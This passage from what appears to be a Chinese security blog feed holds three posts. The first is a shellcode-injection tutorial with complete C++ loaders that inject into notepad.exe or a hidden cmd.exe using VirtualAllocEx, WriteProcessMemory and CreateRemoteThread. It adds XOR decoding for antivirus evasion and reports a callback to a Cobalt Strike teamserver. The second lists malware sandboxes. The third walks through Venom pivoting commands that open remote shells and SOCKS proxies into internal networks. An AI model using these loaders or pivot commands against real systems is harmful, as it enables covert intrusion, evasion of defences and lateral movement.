class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess, <span class="comment">// 渴望得到的访问权限（标志），那肯定是PROCESS_ALL_ACCESS，所有权限啊</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  bInheritHandle,  <span class="comment">// 是否继承句柄，一般不</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId      <span class="comment">// 进程标识符，即受害者进程的PID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用OpenProcess获取进程的handler，需要知道进程的PID。</p><p><strong>假设知道了进程的PID</strong>，那么应该如何将shellcode拷贝进去？之前简单的加载器用的是memcpy方法拷贝shellcode，但是因为我们要写入的是进程的内存区域，所以需要用<strong>WriteProcessMemory</strong>函数</p><h2 id="WriteProcessMemory（）"><a href="#WriteProcessMemory（）" class="headerlink" title="WriteProcessMemory（）"></a>WriteProcessMemory（）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,               <span class="comment">// 要向其中写入数据的进程，即由OpenProcess返回的进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,          <span class="comment">// 要写入的数据的首地址，VirtualAllocEx的返回值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,               <span class="comment">// 指向要写的数据的指针，该指针必须是const指针，即shellcode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,                  <span class="comment">// 要写入的字节数，shellcode大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten <span class="comment">// 接收传输到指定进程中的字节数，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>将shellcode写入内存后，需要调用一下，调用方法为<strong>CreateRemoteThread</strong>()</p><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h2><p><strong>CreateRemoteThread是一个Windows API函数，它能够创建一个在其它进程地址空间中运行的线程</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                 hProcess,           <span class="comment">// 线程所属进程的进程句柄，即OpenProcess返回的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes, <span class="comment">// 线程的安全属性，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                 dwStackSize,        <span class="comment">// 线程栈初始大小,以字节为单位，通常为0，即代表使用系统默认大小.</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,     <span class="comment">// 在远程进程的地址空间中,该进程的线程函数的起始地址。VirtualAllocEx返回值，注意需要强制类型转换成 LPTHREAD_START_ROUTINE</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID                 lpParameter,        <span class="comment">// 传给线程函数的参数的指针，这里为NULL，在DLL注入的时候有重要意义</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                  dwCreationFlags,    <span class="comment">// 线程的创建标志，通常为0，即线程创建后立即运行</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                lpThreadId          <span class="comment">// 指向所创建线程ID的指针，通常为NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="将shellcode注入到notepad-exe中-已知pid"><a href="#将shellcode注入到notepad-exe中-已知pid" class="headerlink" title="将shellcode注入到notepad.exe中(已知pid)"></a>将shellcode注入到notepad.exe中(已知pid)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Injecting to PID: %i&quot;</span>, <span class="built_in">atoi</span>(argv[<span class="number">1</span>]));</span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="built_in">DWORD</span>(<span class="built_in">atoi</span>(argv[<span class="number">1</span>])));</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220115153615536.png" alt="image-20220115153615536"></p><p><img src="http://cdn.polowong.top/image-20220115153558970.png" alt="image-20220115153558970"></p><p><img src="http://cdn.polowong.top/image-20220115153755016.png" alt="image-20220115153755016"></p><p>可以看到shellcode已经被注入到notepad.exe了，并且与CS teamserver建立了网络连接，但是这样不是太方便，需要先知道进程的pid，所以该代码还需要改进。</p><h1 id="将shellcode注入到指定进程中-未知pid"><a href="#将shellcode注入到指定进程中-未知pid" class="headerlink" title="将shellcode注入到指定进程中(未知pid)"></a>将shellcode注入到指定进程中(未知pid)</h1><p>代码如下，但是该方法存在一个问题，注入的权限要求有点大，我试了试注入其他进程（Windows自带的）失败了（<strong>管理员权限可以随便注入</strong>），所以该方法适用于可以RCE的时候，先打开一个notepad然后进行注入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcessSnap;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    DWORD pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取系统中所有进程的快照</span></span><br><span class="line">    hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使用之前要先设置大小</span></span><br><span class="line">    pe32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line">    <span class="comment">// 查看第一个进程</span></span><br><span class="line">    BOOL bRet = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">wcscmp</span>(pe32.szExeFile, <span class="string">L&quot;notepad.exe&quot;</span>) == <span class="number">0</span>) &#123;<span class="comment">//注入到notepad.exe进程中</span></span><br><span class="line">            pid = pe32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取进程句柄</span></span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//远程线程注入部分</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220115163605656.png" alt="image-20220115163605656"></p><p><img src="http://cdn.polowong.top/image-20220115163943913.png" alt="image-20220115163943913">当权限为管理员的时候，可以注入任意进程。上面的cmd框是正常用户权限启动的cmd，下面是run as admin。</p><h1 id="新建进程并注入shellcode"><a href="#新建进程并注入shellcode" class="headerlink" title="新建进程并注入shellcode"></a>新建进程并注入shellcode</h1><p>上面的方法只能注入到现有进程，并且存在权限问题，实用性较低，现考虑新建进程并远程线程注入shellcode.</p><p>注意，下面的代码被杀穿了，还不如shellcode直接加载的效果好，因为注入本来就不是正常操作，不加shellcode上传vt也有13个报毒，仅学习思想。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/INCREMENTAL:NO&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in"><span class="keyword">sizeof</span></span>(si));</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in"><span class="keyword">sizeof</span></span>(pi));</span><br><span class="line">    <span class="comment">//配置startup info，隐藏新启动的进程窗口</span></span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">    si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(STARTUPINFO);</span><br><span class="line">    si.lpReserved = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpDesktop = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpTitle = <span class="literal">NULL</span>;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.cbReserved2 = <span class="literal">NULL</span>;</span><br><span class="line">    si.lpReserved2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    LPCWSTR cmd;</span><br><span class="line">    cmd = <span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">        cmd,<span class="comment">// Executable</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Command line</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Process handle not inheritable</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Thread handle not inheritable</span></span><br><span class="line">        FALSE,<span class="comment">// Set handle inheritance to FALSE</span></span><br><span class="line">        CREATE_NO_WINDOW,            <span class="comment">// Do Not Open a Window</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Use parent&#x27;s environment block</span></span><br><span class="line">        <span class="literal">NULL</span>,<span class="comment">// Use parent&#x27;s starting directory </span></span><br><span class="line">        &amp;si,                <span class="comment">// Pointer to STARTUPINFO structure</span></span><br><span class="line">        &amp;pi <span class="comment">// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)</span></span><br><span class="line">    )) &#123;</span><br><span class="line">        DWORD errval = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;FAILED&quot;</span> &lt;&lt; errval &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(pi.hProcess, <span class="number">1000</span>); <span class="comment">// Allow nslookup 1 second to start/initialize.</span></span><br><span class="line">    <span class="comment">//远程线程注入部分</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in"><span class="keyword">sizeof</span></span>(buf); i++)</span><br><span class="line">   &#123;</span><br><span class="line">       buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文主要参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fengwenhua.top/index.php/archives/65/%E</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>几款优秀的在线样本分析网站(重保值守必备）</title>
    <link href="https://polosec.github.io/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/"/>
    <id>https://polosec.github.io/2022/01/12/%E5%87%A0%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9C%A8%E7%BA%BF%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99-%E9%87%8D%E4%BF%9D%E5%80%BC%E5%AE%88%E5%BF%85%E5%A4%87%EF%BC%89/</id>
    <published>2022-01-12T09:24:00.000Z</published>
    <updated>2022-01-12T09:28:21.540Z</updated>
    
    <content type="html"><![CDATA[<p>排名不分先后，都比较优秀（除了腾讯哈勃）</p><p>1.virustotal</p><p>懂得都懂，用的最多，开放引擎api最多</p><p>亮点功能：在线样本提交与扫描，较为全面。</p><p>2.<a href="https://sandbox.pikker.ee/">sandbox.pikker.ee</a></p><p>亮点功能：免费，字符串提取，静态行为分析，杀软结果识别，<strong>进程分析，文件释放分析，网络连接分析，释放的文件也可以进行分析</strong></p><p><img src="http://cdn.polowong.top/image-20220112172617888.png" alt="image-20220112172617888"></p><p><img src="http://cdn.polowong.top/image-20220112172602344.png" alt="image-20220112172602344"></p><p><img src="http://cdn.polowong.top/image-20220112172542769.png" alt="image-20220112172542769"></p><p>3.ThreadBook sandbox 微步在线云沙箱</p><p><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></p><p>亮点功能：<strong>免费</strong>，在线杀软识别，<strong>行为检测（API调用），执行流程图，进程调用与网络连接</strong></p><p><img src="http://cdn.polowong.top/image-20220112172648489.png" alt="image-20220112172648489"></p><hr><p>4.<a href="https://yomi.yoroi.company/">yomi.yoroi.company</a></p><p>亮点功能：支持试用；<strong>行为分析、动态分析、网络分析、文件释放分析、进程调用图、释放的文件也可以进行分析</strong></p><p><img src="http://cdn.polowong.top/image-20220112172708949.png" alt="image-20220112172708949"></p><p><img src="http://cdn.polowong.top/image-20220112172641040.png" alt="image-20220112172641040"></p><p>5.腾讯哈勃</p><p><a href="https://habo.qq.com/file/">https://habo.qq.com/file/</a></p><p>垃圾：不支持sha1 sha256搜索</p><p>亮点功能：免费</p><p>6.<a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a></p><p>亮点功能：免费、<strong>分析全面（网络、进程、DNS、HTTP、文件释放），释放的文件也可以进行分析，字符串搜索，结合VT结果</strong></p><p><img src="http://cdn.polowong.top/image-20220112172716764.png" alt="image-20220112172716764"></p><p>7.<a href="https://analyze.intezer.com/file-analyses">https://analyze.intezer.com/file-analyses</a></p><p>亮点功能：除了不免费外（可试用，但只有两周），基本都是亮点。<strong>反汇编！！、动态分析、静态分析、网络、进程、文件释放、分析释放的文件、字符串搜索、结合VT结果。。。。等等</strong></p><p><img src="http://cdn.polowong.top/image-20220112172814171.png" alt="image-20220112172814171"></p><p>文件释放分析：</p><p><img src="http://cdn.polowong.top/image-20220112172728847.png" alt="image-20220112172728847"></p><p><strong>推断出了样本中的代码和哪些恶意样本的重合率高，这里推出了net traveler APT组织。</strong></p><p><img src="http://cdn.polowong.top/image-20220112172741816.png" alt="image-20220112172741816"></p><p><img src="http://cdn.polowong.top/image-20220112172753156.png" alt="image-20220112172753156"></p><p>字符串搜索与反汇编</p><p><img src="http://cdn.polowong.top/image-20220112172801789.png" alt="image-20220112172801789"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;排名不分先后，都比较优秀（除了腾讯哈勃）&lt;/p&gt;
&lt;p&gt;1.virustotal&lt;/p&gt;
&lt;p&gt;懂得都懂，用的最多，开放引擎api最多&lt;/p&gt;
&lt;p&gt;亮点功能：在线样本提交与扫描，较为全面。&lt;/p&gt;
&lt;p&gt;2.&lt;a href=&quot;https://sandbox.pikker.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Venom——一款优秀的基于go语言实现的内网穿透工具</title>
    <link href="https://polosec.github.io/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://polosec.github.io/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/</id>
    <published>2022-01-10T14:44:36.000Z</published>
    <updated>2022-01-10T14:44:41.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么选择使用Venom？我认为是方便、快捷、便于理解。</p><h1 id="Venom介绍"><a href="#Venom介绍" class="headerlink" title="Venom介绍"></a>Venom介绍</h1><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p><p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p><p>渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点</p><p>项目地址：<a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>可视化网络拓扑</li><li>多级socks5代理</li><li>多级端口转发</li><li>端口复用 (apache/mysql/…)</li><li>ssh隧道</li><li>交互式shell</li><li>文件的上传和下载</li><li>节点间通信加密</li><li>支持多种平台(Linux/Windows/MacOS)和多种架构(x86/x64/arm/mips)</li></ul><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="http://cdn.polowong.top/image-20220110214230356.png" alt="image-20220110214230356"></p><h1 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h1><p>./admin -lport 8888</p><p><img src="http://cdn.polowong.top/image-20220110214317062.png" alt="image-20220110214317062"></p><h1 id="VM1"><a href="#VM1" class="headerlink" title="VM1"></a>VM1</h1><p>agent.exe -rhost VPS -rport 8888</p><p><img src="http://cdn.polowong.top/image-20220110214330796.png" alt="image-20220110214330796"></p><p>VPS收到来自VM1的请求</p><p><img src="http://cdn.polowong.top/image-20220110214347646.png" alt="image-20220110214347646"></p><p>可以使用show命令查看节点列表，goto 命令进入节点，shell命令获取一个shell</p><p><img src="http://cdn.polowong.top/image-20220110214446359.png" alt="image-20220110214446359"></p><p>goto某一个节点后，使用socks命令在当前主机打开一个socks5代理，以便后续渗透，访问VPS:port 即可。</p><p><img src="http://cdn.polowong.top/image-20220110214720752.png" alt="image-20220110214720752"></p><p>这样就在VPS:7788开启了一个socks5代理，使用proxifier或者proxychains即可通过代理访问内网其他主机的服务。</p><p>在当前节点使用<strong>listen</strong>命令，在当前主机开启一个端口，等待后续渗透过程中的其他主机连接上线</p><p><img src="http://cdn.polowong.top/image-20220110214807474.png" alt="image-20220110214807474"></p><h1 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h1><p>中间重启了一下，上述listen 8888端口变成了<strong>7878</strong>，请注意。</p><p>./agent_linux_x64  -rhost 192.168.88.129 -rport 7878</p><p><img src="http://cdn.polowong.top/image-20220110215942251.png" alt="image-20220110215942251"></p><p>在VPS上可以看到VM2已经连进来了</p><p><img src="http://cdn.polowong.top/image-20220110220001252.png" alt="image-20220110220001252"></p><p>执行shell也没问题</p><p><img src="http://cdn.polowong.top/image-20220110220048338.png" alt="image-20220110220048338"></p><p>继续开监听端口</p><p><img src="http://cdn.polowong.top/image-20220110220108805.png" alt="image-20220110220108805"></p><p>这里可以继续添加socks代理访问该主机同网段的其他服务，但是这次试验没添加同网段主机，所以不做演示。</p><h1 id="VM3"><a href="#VM3" class="headerlink" 